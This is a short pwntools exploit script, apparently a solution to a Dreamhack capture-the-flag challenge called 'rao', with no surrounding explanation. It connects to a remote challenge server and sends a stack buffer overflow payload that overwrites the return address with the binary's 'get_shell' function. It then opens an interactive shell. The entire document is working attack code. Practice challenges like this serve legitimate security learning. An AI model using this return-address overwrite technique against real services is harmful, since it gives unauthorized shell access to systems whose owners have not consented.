from pwn import *

exe = ELF('rao', checksec = False)
#r = process(exe.path)
r = remote(b'host3.dreamhack.games', 23406)

#input()
payload = b'a'*(0x30 + 0x8)
payload += p64(exe.sym['get_shell'])
r.sendlineafter(b'Input: ', payload)
r.interactive()